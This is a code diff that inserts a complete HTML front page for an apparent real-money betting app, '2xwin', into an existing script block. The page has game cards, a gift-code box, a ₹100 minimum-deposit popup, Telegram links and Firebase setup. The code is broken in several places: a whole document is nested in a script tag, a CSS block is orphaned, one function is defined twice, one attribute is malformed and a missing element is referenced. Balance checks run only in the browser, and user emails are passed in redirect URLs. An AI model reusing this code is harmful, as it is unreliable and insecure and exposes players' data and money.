@@ -877,7 +877,2104 @@ font-size:16px;
 </div>
 
 <script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>2xwin</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+  <script>
+if(localStorage.getItem("newUser") === "true"){
+  localStorage.removeItem("newUser"); // 🔥 important
+  window.location.href = "animation.html";
+}
+  </script>
+<script src="game-control.js"></script>
+  
+<style>
 
+/* ===== GAME CARD BASE ===== */
+.game-card{
+min-height:140px;
+border-radius:16px;
+padding:14px;
+cursor:pointer;
+transition:0.2s;
+text-align:center;
+display:flex;
+flex-direction:column;
+justify-content:center;
+}
+.game-card:active{transform:scale(0.97)}
+.game-card h3{margin:6px 0 0;font-size:18px}
+.game-card p{font-size:13px;opacity:0.85}
+
+
+  .game-img{
+  width:70px;
+  height:70px;
+  object-fit:contain;
+  margin:0 auto 8px;
+  display:block;
+  }
+  
+/* BODY */
+body{
+  margin:0;
+  font-family:Arial;
+  background:#000; /* 🔥 Yellow → Black */
+  color:#fff;
+}
+
+/* HEADER */
+.header{padding:15px;font-size:22px;font-weight:bold;text-align:center}
+
+/* 🔥 BANNER SLIDER */
+.banner-slider{
+margin:0 15px 10px;
+border-radius:16px;
+overflow:hidden;
+}
+.banner-track{
+display:flex;
+transition:transform .4s ease;
+}
+.banner-track img{
+width:100%;
+height:180px;
+object-fit:cover;
+flex-shrink:0;
+background:#000;
+}
+
+/* MENU */
+.menu{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;padding:15px}
+
+/* GAME COLORS */
+.wingo-card{
+  background: linear-gradient(135deg,#2196f3,#21cbf3);
+  position: relative;
+  overflow: hidden;
+}
+
+.wingo-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+}
+
+  .aviator-card{
+  background: linear-gradient(135deg,#ff9800,#ff5722);
+  position: relative;
+  overflow: hidden;
+}
+
+.aviator-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+}
+  .dragontiger-card{
+  background: linear-gradient(135deg,#5f2c82,#49a09d);
+  position: relative;
+  overflow: hidden;
+}
+
+.dragontiger-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+} 
+  .roulette-card{
+  background: linear-gradient(135deg,#1abc9c,#16a085);
+  position: relative;
+  overflow: hidden;
+}
+
+.roulette-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+}
+  /* ===== ALL GAME CARDS ===== */
+
+.coinflip-card{
+  background: linear-gradient(135deg,#f5c76a,#cfd3d6);
+  position: relative;
+  overflow: hidden;
+}
+
+.treasure-card{
+  background: linear-gradient(135deg,#7b3f00,#3b1f00);
+  position: relative;
+  overflow: hidden;
+}
+
+.chicken-card{
+  background: linear-gradient(135deg,#f7971e,#ffd200);
+  position: relative;
+  overflow: hidden;
+}
+
+.dice-card{
+  background: linear-gradient(135deg,#ff3b3b,#b30000);
+  position: relative;
+  overflow: hidden;
+}
+
+.plinko-card{
+  background: linear-gradient(135deg,#1aa7a1,#0b6f7a);
+  position: relative;
+  overflow: hidden;
+}
+
+.drax-card{
+  background: linear-gradient(135deg,#ff4fd8,#8f2bff);
+  position: relative;
+  overflow: hidden;
+}
+
+.spinstop-card{
+  background: linear-gradient(135deg,#ff5fa2,#ff2f92);
+  position: relative;
+  overflow: hidden;
+}
+
+.horserace-card{
+  background: linear-gradient(135deg,#0f9b6c,#0a6b4a);
+  position: relative;
+  overflow: hidden;
+}
+
+.ganesh-card{
+  background: linear-gradient(135deg,#8e0000,#ff4d4d);
+  position: relative;
+  overflow: hidden;
+}
+
+.keno-card{
+  background: linear-gradient(135deg,#111,#333);
+  position: relative;
+  overflow: hidden;
+}
+
+.fateshift-card{
+  background: linear-gradient(135deg,#6a00ff,#b100ff);
+  position: relative;
+  overflow: hidden;
+}
+
+.hilo-card{
+  background: linear-gradient(135deg,#00c6ff,#0072ff);
+  position: relative;
+  overflow: hidden;
+}
+
+.dragontower-card{
+  background: linear-gradient(135deg,#ff7a18,#ff3d00);
+  position: relative;
+  overflow: hidden;
+}
+
+.balloon-card{
+  background: linear-gradient(135deg,#ff4fd8,#00c6ff);
+  position: relative;
+  overflow: hidden;
+}
+
+.invest-card{
+  background: linear-gradient(135deg,#FFD700,#FFA500);
+  position: relative;
+  overflow: hidden;
+}
+.newgame-card{
+  background: linear-gradient(135deg,#ff00cc,#3333ff);
+  position: relative;
+  overflow: hidden;
+}
+
+.newgame-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+}
+/* ===== COMMON IMAGE STYLE ===== */
+.coinflip-card img,
+.treasure-card img,
+.chicken-card img,
+.dice-card img,
+.plinko-card img,
+.drax-card img,
+.spinstop-card img,
+.horserace-card img,
+.ganesh-card img,
+.keno-card img,
+.fateshift-card img,
+.hilo-card img,
+.dragontower-card img,
+.balloon-card img,
+.invest-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+}
+  
+  background-color: #21cbf3;
+  position: relative;
+  overflow: hidden;
+}
+
+.wingo-card .overlay{
+  position:absolute;
+  bottom:0;
+  width:100%;
+  padding:10px;
+  background:linear-gradient(to top, rgba(0,0,0,0.7), transparent);
+  border-radius:0 0 16px 16px;
+}
+
+.wingo-card h3{
+  margin:0;
+  font-size:18px;
+}
+
+.wingo-card p{
+  font-size:12px;
+  opacity:0.9;
+}
+.mines-card{
+  background: linear-gradient(135deg,#ff5252,#ff1744);
+  position: relative;
+  overflow: hidden;
+}
+
+.mines-card img{
+  position:absolute;
+  width:100%;
+  height:100%;
+  object-fit:cover;
+  top:0;
+  left:0;
+
+}
+
+.aviator{background:linear-gradient(135deg,#ff9800,#ff5722)}
+.goddevil{background:linear-gradient(135deg,#5f2c82,#49a09d)}
+.chicken{background:linear-gradient(135deg,#f7971e,#ffd200)}
+.roulette{background:linear-gradient(135deg,#1abc9c,#16a085)}
+.plinko{background:linear-gradient(135deg,#1aa7a1,#0b6f7a)}
+.treasure{background:linear-gradient(135deg,#7b3f00,#3b1f00)}
+.coinflip{background:linear-gradient(135deg,#f5c76a,#cfd3d6);color:#111}
+.dice{background:linear-gradient(135deg,#ff3b3b,#b30000)}
+.spinstop{background:linear-gradient(135deg,#ff5fa2,#ff2f92)}
+.horserace{background:linear-gradient(135deg,#0f9b6c,#0a6b4a)}
+.draxturbo{background:linear-gradient(135deg,#ff4fd8,#8f2bff);padding-top:18px}
+.drax-logo{width:46px;margin:0 auto 6px}
+.fateshift{background:linear-gradient(135deg,#6a00ff,#b100ff)}
+.ganeshslots{background:linear-gradient(135deg,#8e0000,#ff4d4d)}
+.ganeshslots img{width:42px;margin:0 auto 6px}
+.keno{background:linear-gradient(135deg,#111,#333)}
+.hilo{background:linear-gradient(135deg,#00c6ff,#0072ff)}
+.dragontower{background:linear-gradient(135deg,#ff7a18,#ff3d00)}
+.ballooncrash{background:linear-gradient(135deg,#ff4fd8,#00c6ff)}
+  .investgame{
+background:linear-gradient(135deg,#FFD700,#FFA500);
+color:#000;
+font-weight:bold;
+  }
+
+/* BOTTOM NAV */
+.bottom-nav{
+position:fixed;bottom:0;left:0;right:0;
+background:#111;display:flex;border-top:1px solid #222
+}
+.nav-btn{flex:1;padding:10px 0;text-align:center;font-size:12px;color:#aaa}
+.nav-btn.active{color:#4caf50;font-weight:bold}
+.nav-btn div{font-size:20px}
+.spacer{height:70px}
+
+/* SUPPORT ICON */
+#supportIcon{
+position: fixed;
+right: 16px;
+bottom: 90px;
+width: 56px;
+height: 56px;
+background: #111;
+color: #fff;
+font-size: 26px;
+border-radius: 50%;
+display: flex;
+align-items: center;
+justify-content: center;
+box-shadow: 0 6px 14px rgba(0,0,0,0.4);
+cursor: pointer;
+z-index: 9999;
+}
+
+/* 🎁 GIFT ICON */
+#giftIcon{
+position: fixed;
+right: 16px;
+bottom: 160px;
+width: 56px;
+height: 56px;
+background: #ff3b3b;
+color: #fff;
+font-size: 26px;
+border-radius: 50%;
+display:flex;
+align-items:center;
+justify-content:center;
+box-shadow:0 6px 14px rgba(0,0,0,0.4);
+cursor:pointer;
+z-index:9999;
+}
+
+/* POPUP */
+.deposit-popup{
+position:fixed;inset:0;background:rgba(0,0,0,.75);
+display:none;align-items:center;justify-content:center;z-index:99999
+}
+.deposit-box{
+width:85%;max-width:340px;
+background:linear-gradient(135deg,#ff9800,#ff5722);
+border-radius:18px;padding:22px;text-align:center
+}
+.deposit-box button{
+margin-top:14px;width:100%;padding:12px;border:none;
+border-radius:12px;background:#000;color:#fff;font-size:16px;font-weight:bold
+}
+
+/* 🎁 GIFT POPUP */
+.gift-popup{
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.75);
+display:none;
+align-items:center;
+justify-content:center;
+z-index:99999
+}
+
+.gift-box{
+width:85%;
+max-width:320px;
+background:#fff;
+border-radius:16px;
+padding:20px;
+text-align:center;
+color:#000;
+}
+
+.gift-box input{
+  width:90%;              /* 🔥 full nahi */
+  padding:12px;
+  margin:10px auto 0;     /* 🔥 center */
+  border-radius:10px;
+  border:1px solid #ccc;
+  display:block;          /* 🔥 center ke liye important */
+  font-size:16px;
+}
+.gift-box button{
+margin-top:12px;
+width:100%;
+padding:12px;
+border:none;
+border-radius:10px;
+background:#ff3b3b;
+color:#fff;
+font-size:16px;
+}
+/* 🔥 CUSTOM POPUP */
+.custom-popup{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.7);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:99999;
+}
+
+.popup-card{
+  width:85%;
+  max-width:320px;
+  background:linear-gradient(135deg,#1e1e1e,#2c2c2c);
+  border-radius:18px;
+  padding:20px;
+  text-align:center;
+  color:#fff;
+  box-shadow:0 0 20px rgba(0,255,100,0.3);
+}
+
+.popup-card h2{
+  margin:0;
+  color:#00e676;
+}
+
+.popup-card p{
+  margin:15px 0;
+  font-size:16px;
+}
+
+.popup-card button{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:10px;
+  background:#00c853;
+  color:#000;
+  font-weight:bold;
+  font-size:16px;
+  }
+  .block-popup{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.9);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:99999;
+}
+
+.block-box{
+  width:85%;
+  max-width:320px;
+  background:linear-gradient(145deg,#0a0a0a,#1a0000);
+  border:2px solid #ff0000;
+  border-radius:16px;
+  padding:25px;
+  text-align:center;
+  box-shadow:0 0 25px red, inset 0 0 20px rgba(255,0,0,0.5);
+  animation:pop 0.3s ease;
+}
+
+.block-box h1{
+  color:#ff0000;
+  margin:0;
+  text-shadow:0 0 10px red;
+}
+
+.block-box p{
+  margin:12px 0;
+  color:#fff;
+}
+
+.block-box button{
+  margin-top:10px;
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:10px;
+  background:#ff0000;
+  color:#fff;
+  font-weight:bold;
+  box-shadow:0 0 15px red;
+}
+
+@keyframes pop{
+  from{transform:scale(0.6);}
+  to{transform:scale(1);}
+}
+  .security-popup{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.8);
+  display:none;
+  align-items:center;
+  justify-content:center;
+  z-index:99999;
+}
+
+.security-box{
+  width:90%;
+  max-width:340px;
+  background:#fff;
+  border-radius:16px;
+  padding:15px;
+  text-align:center;
+  animation:pop 0.3s ease;
+}
+
+.security-box h2{
+  margin:0;
+  background:#ff4d4d;
+  color:#fff;
+  padding:10px;
+  border-radius:10px;
+  font-size:16px;
+}
+
+.security-box button{
+  margin-top:10px;
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:10px;
+  background:linear-gradient(90deg,#ff7a7a,#ff4d4d);
+  color:#fff;
+  font-weight:bold;
+  font-size:16px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">🏦2xwin🏦</div>
+
+<div id="giftIcon" onclick="openGiftBox()">🎁</div>
+<div id="supportIcon" onclick="openSupportMail()">✉️</div>
+
+<div class="banner-slider">
+<div class="banner-track" id="bannerTrack">
+
+<img src="images/file_000000005f4c720bbba852b908a667a4.png">
+
+<img src="images/file_000000008b1471fabef74f625ab8d7dc.png">
+
+<img src="images/file_000000000bf47208865428f7df76c82f.png" onclick="window.open('https://www.instagram.com/2xwin_official','_blank')">
+<!-- 🔥 NEW TELEGRAM BANNER -->
+<img src="images/36823-removebg-preview.png" onclick="openTelegram()">
+</div>
+</div>
+
+<!-- MENU -->
+<div class="menu">
+
+
+  <!-- WINGO -->
+
+<div class="game-card wingo-card" onclick="openGame('wingo.html')">
+  <img src="images/27725-removebg-preview.png">
+</div>
+  
+<div class="game-card mines-card" onclick="openGame('mines.html')">
+  <img src="images/27763-removebg-preview.png">
+</div>
+  
+<div class="game-card newgame-card" onclick="openJiliGame16()">
+  <img src="images/38404-removebg-preview.png">
+</div>
+
+<div class="game-card dragontiger-card" onclick="openGame('dragon-tiger.html')">
+  <img src="images/27708-removebg-preview.png">
+</div>
+  
+<div class="game-card roulette-card" onclick="openJiliRoulette()">
+  <img src="images/27709-removebg-preview.png">
+</div>
+
+  <!-- AVIATOR REAL -->
+<div class="game-card aviator-card" onclick="openGame('m416spiner.html')">
+  <img src="images/33874-removebg-preview.png">
+</div>
+
+<!-- COIN FLIP -->
+<div class="game-card coinflip-card" onclick="openGame('coinflip.html')">
+  <img src="images/27710-removebg-preview.png">
+</div>
+
+<!-- TREASURE -->
+<div class="game-card treasure-card" onclick="openGame('treasure.html')">
+  <img src="images/27711-removebg-preview.png">
+</div>
+
+<!-- CHICKEN -->
+<div class="game-card chicken-card" onclick="openGame('chicken-road.html')">
+  <img src="images/27712-removebg-preview.png">
+</div>
+
+<!-- DICE -->
+<div class="game-card dice-card" onclick="openGame('dice.html')">
+  <img src="images/27713-removebg-preview.png">
+</div>
+
+<!-- PLINKO -->
+<div class="game-card wingo-card" onclick="openJiliGame('H5-69872760')">
+  <img src="images/38177-removebg-preview.png">
+</div>
+
+<!-- DRAX -->
+<div class="game-card drax-card" onclick="openGame('drax-turbo-drive.html')">
+  <img src="images/27715-removebg-preview.png">
+</div>
+
+<!-- SPIN STOP -->
+<div class="game-card spinstop-card" onclick="openGame('spin-stop.html')">
+  <img src="images/27716-removebg-preview.png">
+</div>
+
+<!-- HORSE RACE -->
+<div class="game-card horserace-card" onclick="openGame('horse-race.html')">
+  <img src="images/27717-removebg-preview.png">
+</div>
+
+<!-- GANESH -->
+<div class="game-card ganesh-card" onclick="openGame('ganesh-slots.html')">
+  <img src="images/27718-removebg-preview.png">
+</div>
+
+<!-- KENO -->
+<div class="game-card keno-card" onclick="openGame('keno.html')">
+  <img src="images/27719-removebg-preview.png">
+</div>
+
+<!-- FATE SHIFT -->
+<div class="game-card fateshift-card" onclick="openGame('fate-shift.html')">
+  <img src="images/27720-removebg-preview.png">
+</div>
+
+<!-- HILO -->
+<div class="game-card hilo-card" onclick="openGame('hilo.html')">
+  <img src="images/27721-removebg-preview.png">
+</div>
+
+<!-- DRAGON TOWER -->
+<div class="game-card dragontower-card" onclick="openGame('dragon-tower.html')">
+  <img src="images/27722-removebg-preview.png">
+</div>
+
+<!-- BALLOON -->
+<div class="game-card balloon-card" onclick="openJiliGame()">
+  <img src="images/38180-removebg-preview.png">
+</div>
+
+
+<!-- NEW GAME -->
+<div class="game-card newgame-card" onclick="openGame('7updown.html')">
+  <img src="images/28315-removebg-preview.png">
+</div>
+  
+<!-- INVEST -->
+<div class="game-card invest-card" onclick="openGame('draxbet-invest.html')">
+  <img src="images/27724-removebg-preview.png">
+</div>
+  
+  <!-- NEW GAME 1 -->
+<div class="game-card drax-card"onclick="openJiliGame3()"">
+  <img src="images/38184-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 2 -->
+<div class="game-card spinstop-card" onclick="openJiliGame2()">
+  <img src="images/file_00000000161871fa9bc14bbacaa776e7.png">
+</div>
+
+<!-- NEW GAME 3 -->
+<div class="game-card horserace-card"onclick="openJiliGame3()">
+  <img src="images/38391-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 4 -->
+<div class="game-card ganesh-card"onclick="openJiliGame4()">
+  <img src="images/38387-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 5 -->
+<div class="game-card keno-card"onclick="openJiliGame5()">
+  <img src="images/38214-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 6 -->
+<div class="game-card fateshift-card"onclick="openJiliGame6()">
+  <img src="images/game6.png">
+</div>
+
+<!-- NEW GAME 7 -->
+<div class="game-card hilo-card" onclick="openJiliGame7()">
+  <img src="images/game7.png">
+</div>
+
+<!-- NEW GAME 8 -->
+<div class="game-card dragontower-card" onclick="openJiliGame8()">
+  <img src="images/38238-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 9 -->
+<div class="game-card balloon-card" onclick="openJiliGame9()">
+  <img src="images/38241-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 10 -->
+<div class="game-card newgame-card" onclick="openJiliGame10()">
+  <img src="images/38244-removebg-preview.png">
+</div>
+  <!-- NEW GAME 11 -->
+<div class="game-card drax-card" onclick="openJiliGame11()">
+  <img src="images/38251-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 12 -->
+<div class="game-card spinstop-card" onclick="openJiliGame12()">
+  <img src="images/38255-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 13 -->
+<div class="game-card horserace-card" onclick="openJiliGame13()">
+  <img src="images/38252-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 14 -->
+<div class="game-card ganesh-card" onclick="openJiliGame14()">
+  <img src="images/38260-removebg-preview.png">
+</div>
+
+<!-- NEW GAME 15 -->
+<div class="game-card keno-card" onclick="openJiliGame15()">
+  <img src="images/38259-removebg-preview.png">
+</div>
+  <!-- GAME 16 -->
+<div class="game-card aviator-card" onclick="openGame('aviator.html')">
+  <img src="images/27707-removebg-preview.png">
+</div>
+
+<!-- GAME 17 -->
+<div class="game-card newgame-card" onclick="openJiliGame17()">
+  <img src="images/38403-removebg-preview.png">
+</div>
+
+<!-- GAME 18 -->
+<div class="game-card newgame-card" onclick="openJiliGame18()">
+  <img src="images/38407-removebg-preview.png">
+</div>
+
+  <!-- GAME 19 -->
+<div class="game-card newgame-card" onclick="openJiliGame19()">
+  <img src="images/38567-removebg-preview.png">
+</div>
+
+<!-- GAME 20 -->
+<div class="game-card newgame-card" onclick="openJiliGame20()">
+  <img src="images/38568-removebg-preview.png">
+</div>
+
+<!-- GAME 21 -->
+<div class="game-card newgame-card" onclick="openJiliGame21()">
+  <img src="images/38573-removebg-preview.png">
+</div>
+
+<!-- GAME 22 -->
+<div class="game-card newgame-card" onclick="openJiliGame22()">
+  <img src="images/38569-removebg-preview.png">
+</div>
+
+<!-- GAME 23 -->
+<div class="game-card newgame-card" onclick="openJiliGame23()">
+  <img src="images/38575-removebg-preview.png">
+</div>
+  <!-- GAME 24 -->
+<div class="game-card newgame-card" onclick="openJiliGame24()">
+  <img src="images/38599-removebg-preview.png">
+</div>
+
+<!-- GAME 25 -->
+<div class="game-card newgame-card" onclick="openJiliGame25()">
+  <img src="images/38600-removebg-preview.png">
+</div>
+
+<!-- GAME 26 -->
+<div class="game-card newgame-card" onclick="openJiliGame26()">
+  <img src="images/38668-removebg-preview.png">
+</div>
+
+<!-- GAME 27 -->
+<div class="game-card newgame-card" onclick="openJiliGame27()">
+  <img src="images/38610-removebg-preview.png">
+</div>
+
+<!-- GAME 28 -->
+<div class="game-card newgame-card" onclick="openJiliGame28()">
+  <img src="images/38671-removebg-preview.png">
+</div>
+
+<!-- GAME 29 -->
+<div class="game-card newgame-card" onclick="openJiliGame29()">
+  <img src="images/38673-removebg-preview.png">
+</div>
+
+<!-- GAME 30 -->
+<div class="game-card newgame-card" onclick="openJiliGame30()">
+  <img src="images/38675-removebg-preview.png">
+</div>
+  <!-- GAME 31 -->
+<div class="game-card newgame-card" onclick="openJiliGame31()">
+  <img src="images/38699-removebg-preview.png">
+</div>
+<div class="spacer"></div>
+
+<!-- GIFT POPUP -->
+<div class="gift-popup" id="giftPopup">
+<div class="gift-box">
+<h2>🎁 Redeem Gift Code</h2>
+<input type="text" id="giftCodeInput">
+<button onclick="redeemCode()">Redeem</button>
+</div>
+</div>
+
+  <div id="successPopup" class="custom-popup">
+  <div class="popup-card">
+    <h2>✅ Success</h2>
+    <p id="popupText"></p>
+    <button onclick="closePopup()">OK</button>
+  </div>
+  </div>
+  
+<!-- DEPOSIT POPUP -->
+<div class="deposit-popup" id="depositPopup">
+<div class="deposit-box">
+<h2>Minimum Deposit ₹100</h2>
+<p>Play karne ke liye pehle ₹100 deposit karo</p>
+<button onclick="location.href='wallet.html'">Deposit Now</button>
+</div>
+</div>
+
+<div class="bottom-nav">
+<div class="nav-btn active"><div>🏠</div>Home</div>
+<div class="nav-btn" onclick="location.href='wallet.html'"><div>💰</div>Wallet</div>
+<div class="nav-btn" onclick="location.href='promotion.html'"><div>🎁</div>Promotion</div>
+<div class="nav-btn" onclick="location.href='account.html'"><div>👤</div>Account</div>
+</div>
+
+<script>
+
+window.openSupportMail = function(){
+
+  // 🔥 try to open telegram app
+  window.location.href="tg://resolve?domain=X2xwinxsupportk";
+
+  // 🔥 fallback (browser me open)
+  setTimeout(()=>{
+    window.open("https://t.me/X2xwinxsupportk","_blank");
+  },800);
+
+}
+window.openTelegram = function(){
+
+  // direct open telegram channel
+  window.location.href = "tg://resolve?domain=x2xwinofficieal6";
+
+  // fallback browser
+  setTimeout(()=>{
+    window.open("https://t.me/x2xwinofficieal6","_blank");
+  },800);
+
+}
+window.openGiftBox = function(){
+document.getElementById("giftPopup").style.display="flex";
+}
+
+  
+  function showPopup(text){
+  document.getElementById("popupText").innerText = text;
+  document.getElementById("successPopup").style.display = "flex";
+}
+
+function closePopup(){
+  document.getElementById("successPopup").style.display = "none";
+}
+
+  function closeSecurityPopup(){
+  document.getElementById("securityPopup").style.display="none";
+}
+
+// 🔥 AUTO SHOW ON PAGE LOAD
+window.onload = function(){
+
+  // sirf 1 baar show karna ho to uncomment kar
+  // if(localStorage.getItem("seenSecurity")) return;
+
+  setTimeout(()=>{
+    document.getElementById("securityPopup").style.display="flex";
+
+    // auto close after 7 sec
+    setTimeout(()=>{
+      closeSecurityPopup();
+    },7000);
+
+    // localStorage.setItem("seenSecurity","true");
+
+  },1000);
+
+};
+</script>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import {
+  getFirestore, collection, getDocs, query, where,
+  updateDoc, doc, getDoc
+} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+const firebaseConfig = {
+apiKey: "AIzaSyBx3J9aGn_98rTPgurMMKw_GR3puIMj4Ms",
+authDomain: "colourcash-ea60e.firebaseapp.com",
+projectId: "colourcash-ea60e",
+storageBucket: "colourcash-ea60e.firebasestorage.app",
+messagingSenderId: "403688058646",
+appId: "1:403688058646:web:f1753360471528f275ea37"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+  window.openJiliRoulette = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 NEW GAME UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=d4fc911a31b3a61edd83bdd95e36f3bf";
+};
+window.openJiliGame = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // ✅ FIXED
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=a990de177577a2e6a889aaac5f57b429";
+};
+  window.openJiliGamePlinko = async function(){
+
+  console.log("🔥 PLINKO CLICKED");
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  if(!userEmail){
+    alert("User not logged in");
+    return;
+  }
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // ✅ FINAL UID (Plinko)
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=490096198e28f770a3f85adb6ee49e0f";
+};
+  
+  window.openJiliGame3 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 1 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=582a58791928760c28ec4cef3392a49f";
+};
+  window.openJiliGame2 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // ❌ OLD UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=cc686634b4f953754b306317799f1f39";
+};
+  window.openJiliGame3 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 3rd GAME UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=eba92b1d3abd5f0d37dfbe112abdf0e2";
+};
+  window.openJiliGame4 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 4 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=2c17b7c4e2ce5b8bebf4bd10e3e958d7";
+};
+  window.openJiliGame5 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 5 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=6b283c434fd44250d83b7c2420f164f9";
+};
+  window.openJiliGame6 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 6 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=82c5c404cf4c0790deb42a2b5653533c";
+};
+  window.openJiliGame7 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 7 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=28bc4a33c985ddce6acd92422626b76f";
+};
+  window.openJiliGame8 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 8 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=6a7e156ceec5c581cd6b9251854fe504";
+};
+  window.openJiliGame9 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
